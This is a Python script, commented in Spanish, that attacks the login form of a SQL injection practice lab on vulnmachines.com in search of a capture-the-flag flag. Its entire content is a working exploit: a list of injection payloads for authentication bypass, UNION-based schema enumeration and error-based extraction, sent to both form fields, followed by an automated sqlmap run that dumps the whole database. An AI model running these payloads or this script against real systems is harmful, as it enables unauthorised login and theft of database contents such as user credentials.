#!/usr/bin/env python3
import requests
import time
import re

# URL del target
url = "http://hackme1.vulnmachines.com/sqli/Error-based/Post-error-based-single.php"

def test_payload(payload, param="uname"):
    try:
        data = {
            "uname": payload if param == "uname" else "admin",
            "passwd": payload if param == "passwd" else "admin", 
            "login": "login"
        }
        
        print(f"\n[TESTING] {param}: {payload}")
        response = requests.post(url, data=data, timeout=5)
        
        content = response.text
        
        # Buscar flags específicamente
        flag_patterns = [
            r'vnm\{[^}]+\}',
            r'flag\{[^}]+\}',
            r'FLAG\{[^}]+\}',
            r'VNM\{[^}]+\}',
            r'[a-zA-Z0-9_]{20,}',  # Posibles flags sin formato específico
        ]
        
        for pattern in flag_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            if matches:
                print(f"[FLAG FOUND] {matches}")
                return matches
        
        # Buscar información de base de datos
        if "mysql" in content.lower() or "error" in content.lower():
            print(f"[INFO] Response contains database info (length: {len(content)})")
            # Mostrar parte de la respuesta que podría contener información útil
            if len(content) > 1000:
                # Buscar secciones que contengan información
                lines = content.split('\n')
                for i, line in enumerate(lines):
                    if any(keyword in line.lower() for keyword in ['mysql', 'error', 'table', 'column', 'database']):
                        print(f"[LINE {i}] {line[:100]}...")
        
        return []
            
    except Exception as e:
        print(f"[ERROR] {e}")
        return []

def main():
    print("=== Flag Search ===")
    print(f"Target: {url}")
    print("=" * 50)
    
    # Payloads específicos para encontrar flags
    flag_payloads = [
        # Bypass básico
        "admin' OR '1'='1' --",
        "admin' OR 1=1 --",
        
        # Union queries para extraer datos
        "admin' UNION SELECT 1,2,3 --",
        "admin' UNION SELECT 'a','b','c' --",
        "admin' UNION SELECT NULL,NULL,NULL --",
        
        # Buscar en tablas comunes
        "admin' UNION SELECT * FROM users --",
        "admin' UNION SELECT * FROM admin --",
        "admin' UNION SELECT * FROM login --",
        "admin' UNION SELECT * FROM accounts --",
        "admin' UNION SELECT * FROM flag --",
        "admin' UNION SELECT * FROM flags --",
        "admin' UNION SELECT * FROM data --",
        "admin' UNION SELECT * FROM secret --",
        "admin' UNION SELECT * FROM secrets --",
        
        # Información del sistema
        "admin' UNION SELECT version(),user(),database() --",
        "admin' UNION SELECT @@version,@@hostname,@@datadir --",
        
        # Listar todas las tablas
        "admin' UNION SELECT table_name,2,3 FROM information_schema.tables --",
        "admin' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database() --",
        
        # Listar todas las columnas
        "admin' UNION SELECT column_name,table_name,3 FROM information_schema.columns --",
        "admin' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_schema=database() --",
        
        # Error-based extraction
        "admin' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e)) --",
        "admin' AND UPDATEXML(1, CONCAT(0x7e, (SELECT user()), 0x7e), 1) --",
        "admin' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()), 0x7e)) --",
        
        # Buscar flags en todas las tablas
        "admin' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_name LIKE '%flag%' --",
        "admin' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_name LIKE '%secret%' --",
        "admin' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_name LIKE '%data%' --",
        
        # Subqueries para extraer datos
        "admin' UNION SELECT (SELECT table_name FROM information_schema.tables LIMIT 1),2,3 --",
        "admin' UNION SELECT (SELECT column_name FROM information_schema.columns LIMIT 1),2,3 --",
        
        # Blind SQL injection
        "admin' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --",
        "admin' AND (SELECT COUNT(*) FROM information_schema.tables) = 1 --",
    ]
    
    all_flags = []
    
    # Probar payloads en uname
    print("\n[TESTING UNAME PARAMETER]")
    for payload in flag_payloads:
        flags = test_payload(payload, "uname")
        all_flags.extend(flags)
        time.sleep(0.5)  # Reducir delay
    
    # Probar payloads en passwd
    print("\n[TESTING PASSWD PARAMETER]")
    for payload in flag_payloads:
        flags = test_payload(payload, "passwd")
        all_flags.extend(flags)
        time.sleep(0.5)
    
    # Resumen
    if all_flags:
        print(f"\n[SUMMARY] Flags found: {set(all_flags)}")
    else:
        print("\n[SUMMARY] No flags found. Trying alternative approach...")
        
        # Intentar con sqlmap directamente
        print("\n[SQLMAP APPROACH]")
        import subprocess
        try:
            result = subprocess.run([
                'sqlmap', '-u', url, 
                '--data=uname=admin&passwd=admin&login=login',
                '--batch', '--dbs', '--tables', '--columns', '--dump'
            ], capture_output=True, text=True, timeout=30)
            print("SQLMap output:", result.stdout)
        except Exception as e:
            print(f"SQLMap error: {e}")

if __name__ == "__main__":
    main()